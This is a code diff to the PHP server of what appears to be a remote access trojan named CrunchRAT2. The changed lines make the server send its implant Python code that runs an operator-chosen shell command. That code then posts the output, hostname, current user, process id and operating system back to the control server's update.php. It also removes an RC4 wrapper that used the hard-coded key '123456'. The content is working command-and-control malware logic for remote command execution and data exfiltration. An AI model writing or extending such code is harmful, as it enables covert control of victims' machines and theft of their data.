@@ -103,7 +103,10 @@
 
                     # TO DO: Add in RC4 encrypted update to "update.php"
                     # TO DO: Add in retrieval of command from "tasks" table
-                    echo rc4("123456", "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); out, err = process.communicate(); print err; print out");
+
+                    echo "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); output, error = process.communicate(); post_data = {'hostname': hostname, 'current_user': current_user, 'process_id': process_id, 'operating_system': operating_system, 'output': output, 'error': error}; request = urllib2.Request('http://127.0.0.1/CrunchRAT2/Website/update.php', data = json.dumps(post_data)); request.add_header('User-Agent', user_agent); request.add_header('Content-Type', 'application/json'); f = urllib2.urlopen(request); response = f.read(); print response";
+
+                    #echo rc4("123456", "print user_agent");
                 }
             }
         }
